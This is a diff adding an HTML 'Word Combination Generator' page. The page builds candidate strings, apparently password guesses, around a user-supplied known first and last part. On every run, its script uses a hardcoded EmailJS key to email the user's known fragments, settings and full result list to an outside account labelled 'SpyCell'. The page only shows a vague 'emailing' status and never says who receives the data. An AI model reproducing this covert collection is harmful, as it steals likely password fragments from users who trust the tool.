@@ -1,0 +1,239 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Word Generator</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+
+<style>
+* { box-sizing: border-box; }
+
+body {
+  background: radial-gradient(circle at top, #020b12, #000);
+  color: #00ffcc;
+  font-family: "Courier New", monospace;
+  margin: 0;
+}
+
+a {
+  color: #00ffcc;
+  text-decoration: none;
+  display: flex;
+  justify-content: center;
+  margin: 15px;
+}
+
+h1 { text-align: center; }
+
+.container {
+  max-width: 650px;
+  margin: 20px auto;
+  background: rgba(0,26,26,.6);
+  padding: 20px;
+  border-radius: 10px;
+  border: 1px solid rgba(0,255,204,.4);
+}
+
+label {
+  display: block;
+  font-size: 13px;
+  margin-top: 10px;
+}
+
+input[type="text"],
+input[type="number"] {
+  width: 100%;
+  padding: 10px;
+  background: #000;
+  color: #00ffcc;
+  border: 1px solid rgba(0,255,204,.4);
+  border-radius: 5px;
+  margin-top: 5px;
+}
+
+input[type="checkbox"] {
+  margin-right: 6px;
+}
+
+button {
+  width: 100%;
+  margin-top: 15px;
+  padding: 12px;
+  background: transparent;
+  color: #00ffcc;
+  border: 1px solid #00ffcc;
+  cursor: pointer;
+}
+
+button:hover {
+  background: #00ffcc;
+  color: #000;
+}
+
+.hidden { display: none; }
+
+.output {
+  background: #000;
+  border: 1px solid rgba(0,255,204,.4);
+  padding: 10px;
+  margin-top: 15px;
+  max-height: 260px;
+  overflow-y: auto;
+  font-size: 13px;
+}
+
+#status {
+  text-align: center;
+  font-size: 13px;
+  margin-top: 10px;
+}
+
+.success { color: #00ffcc; }
+.error { color: #ff5f5f; }
+</style>
+</head>
+
+<body>
+
+<a href="../index.html">⬅ Back</a>
+<h1>WORD COMBINATION GENERATOR</h1>
+
+<div class="container">
+
+<label>Total Length</label>
+<input id="length" type="number" min="1">
+
+<label><input type="checkbox" id="useLower"> Lowercase</label>
+<label><input type="checkbox" id="useUpper"> Uppercase</label>
+<label><input type="checkbox" id="useNums"> Numbers</label>
+<label><input type="checkbox" id="useSpec"> Special</label>
+
+<label id="specCharsLabel" class="hidden">Special characters</label>
+<input id="specChars" class="hidden" type="text">
+
+<label id="specCountLabel" class="hidden">Number of special characters</label>
+<input id="specCount" class="hidden" type="number">
+
+<label id="digitCountLabel" class="hidden">Number of digits</label>
+<input id="digitCount" class="hidden" type="number">
+
+<label>Known First Part</label>
+<input id="firstPart" type="text">
+
+<label>Known Last Part</label>
+<input id="lastPart" type="text">
+
+<button id="generateBtn">Generate</button>
+
+<div id="status"></div>
+<div class="output" id="output"></div>
+</div>
+
+<script>
+emailjs.init("qpU9rhcIiteDcetie");
+
+/* ===== TOGGLES ===== */
+const toggle = (box, ids) => {
+  box.onchange = () =>
+    ids.forEach(id =>
+      document.getElementById(id).classList
+        .toggle("hidden", !box.checked)
+    );
+};
+
+toggle(useSpec, ["specChars","specCharsLabel","specCount","specCountLabel"]);
+toggle(useNums, ["digitCount","digitCountLabel"]);
+
+/* ===== GENERATOR ===== */
+generateBtn.onclick = () => {
+  output.innerHTML = "";
+  status.textContent = "";
+
+  const length = +lengthEl.value;
+  if (!length) return error("Length required");
+
+  let charset = "";
+  if (useLower.checked) charset += "abcdefghijklmnopqrstuvwxyz";
+  if (useUpper.checked) charset += "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
+  if (useNums.checked) charset += "0123456789";
+  if (useSpec.checked) charset += (specChars.value || "!@#$");
+
+  if (!charset) return error("Select character types");
+
+  const first = firstPart.value;
+  const last = lastPart.value;
+  const remain = length - first.length - last.length;
+  if (remain < 0) return error("First + Last exceeds length");
+
+  const spc = +specCount.value || 0;
+  const dig = +digitCount.value || 0;
+  if (spc + dig > remain) return error("Invalid number distribution");
+
+  let results = [];
+  const MAX = 2000;
+
+  function gen(cur="", s=0, d=0) {
+    if (results.length >= MAX) return;
+    if (cur.length === remain) {
+      if (s === spc && d === dig)
+        results.push(first + cur + last);
+      return;
+    }
+    for (let c of charset) {
+      gen(
+        cur + c,
+        s + (specChars.value.includes(c)?1:0),
+        d + (c>='0'&&c<='9'?1:0)
+      );
+    }
+  }
+
+  gen();
+  results.forEach(r => output.innerHTML += `<div>${r}</div>`);
+
+  status.textContent = "Generated & emailing…";
+  status.className = "success";
+
+  /* ===== EMAIL REPORT ===== */
+  const report =
+`WORD GENERATOR REPORT
+--------------------
+Length: ${length}
+Lowercase: ${useLower.checked}
+Uppercase: ${useUpper.checked}
+Numbers: ${useNums.checked}
+Specials: ${useSpec.checked}
+
+First Part: ${first || "N/A"}
+Last Part: ${last || "N/A"}
+
+Generated Count: ${results.length}
+
+RESULTS:
+${results.slice(0, results.length)
+  .map((r, i) => `${i + 1}. ${r}`)
+  .join("\n")}
+`;
+
+  emailjs.send("service_s5vx7yl",
+        "template_fq9lhw7",{
+          project: "SpyCell 🕵️", page: "Word Generator", 
+        message: report, 
+        date: new Date().toLocaleDateString(), 
+        time: new Date().toLocaleTimeString()
+  });
+};
+
+/* ===== HELPERS ===== */
+const error = msg => {
+  status.textContent = msg;
+  status.className = "error";
+};
+
+const lengthEl = document.getElementById("length");
+</script>
+
+</body>
+</html>
